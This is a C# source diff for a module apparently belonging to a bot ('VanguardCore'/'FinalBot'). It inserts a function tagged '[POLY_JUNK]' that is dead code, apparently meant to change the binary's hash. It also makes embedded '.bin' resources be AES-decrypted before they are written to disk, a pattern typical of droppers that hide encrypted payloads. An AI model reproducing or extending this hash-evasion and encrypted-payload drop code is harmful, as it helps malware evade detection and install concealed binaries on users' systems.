@@ -8,6 +8,12 @@ namespace VanguardCore.Modules
 {
     public static class ResourceModule
     {
+        // [POLY_JUNK]
+        private static void _vanguard_4526c7c4() {
+            int val = 30518;
+            if (val > 50000) Console.WriteLine("Hash:" + 30518);
+        }
+
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern bool SetDllDirectory(string lpPathName);
 
@@ -53,7 +59,6 @@ namespace VanguardCore.Modules
         {
             try
             {
-                // Check if already exists and same size (optional)
                 if (File.Exists(destPath)) return;
 
                 var assembly = Assembly.GetExecutingAssembly();
@@ -61,28 +66,33 @@ namespace VanguardCore.Modules
                 {
                     if (stream == null)
                     {
-                        // Fallback: try different prefix if namespace differs
                         string altName = resourceName.Replace("VanguardCore.", "FinalBot.");
                         using (Stream altStream = assembly.GetManifestResourceStream(altName))
                         {
                             if (altStream == null) return;
-                            SaveStream(altStream, destPath);
+                            SaveStream(altStream, destPath, resourceName.EndsWith(".bin"));
                         }
                     }
                     else
                     {
-                        SaveStream(stream, destPath);
+                        SaveStream(stream, destPath, resourceName.EndsWith(".bin"));
                     }
                 }
             }
             catch { }
         }
 
-        private static void SaveStream(Stream stream, string destPath)
+        private static void SaveStream(Stream stream, string destPath, bool isEncrypted = false)
         {
-            using (FileStream fs = new FileStream(destPath, FileMode.Create, FileAccess.Write))
+            using (MemoryStream ms = new MemoryStream())
             {
-                stream.CopyTo(fs);
+                stream.CopyTo(ms);
+                byte[] data = ms.ToArray();
+                if (isEncrypted)
+                {
+                    data = AesHelper.Decrypt(data);
+                }
+                if (data != null) File.WriteAllBytes(destPath, data);
             }
         }
     }
